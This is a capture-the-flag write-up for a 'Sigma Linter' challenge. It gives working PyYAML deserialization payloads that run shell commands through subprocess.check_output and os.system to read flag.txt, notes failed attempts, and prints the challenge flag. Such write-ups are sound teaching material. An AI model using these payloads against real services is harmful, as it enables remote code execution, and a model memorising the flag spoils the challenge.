# Prompt

![](/huntress_2025/Day_05/Sigma_Linter/Challenge_SigmaLinter.png "Challenge Prompt")

# Solution

- They had a similar challenge to this in the past, so this one wasn’t too much of a challenge. Given that it is linting, you can solve this challenge by abusing YAML deserialization, specifically PyYaml gadget.

```python
!!python/object/new:str
  args: [!!python/object/apply:subprocess.check_output [["bash","-lc","cat flag.txt"]]]
```

![Original Solution](/huntress_2025/Day_05/Sigma_Linter/Original_Solution.png "Original Solution")

- Alternative solution (simpler)

```python
!!python/object/apply:subprocess.check_output
  args: [["cat", "flag.txt"]]
```

![Alternative Solution](/huntress_2025/Day_05/Sigma_Linter/Alternative_Solution.png "Alternative Solution")

- Failed Attempts

- For testing, something like this won’t work because os.system prints the return code and not the actual flag value or command output. 

```python
!!python/object/apply:os.system 
  args: ["cat ./flag.txt"]
```
![Failure 1](/huntress_2025/Day_05/Sigma_Linter/Failure_1.png "Failure 1")

```python
!!python/object/apply:subprocess.check_output
  args: ["cat", "flag.txt"]
```

![alt text](/huntress_2025/Day_05/Sigma_Linter/Failure_2.png "Failure 2")

```python
!!python/object/apply:subprocess.check_output
  args: ["ls"]
```

![alt text](/huntress_2025/Day_05/Sigma_Linter/Failure_3.png "Failure 3")

# Flag

- flag{b692115306c8e5c54a2c8908371a4c72}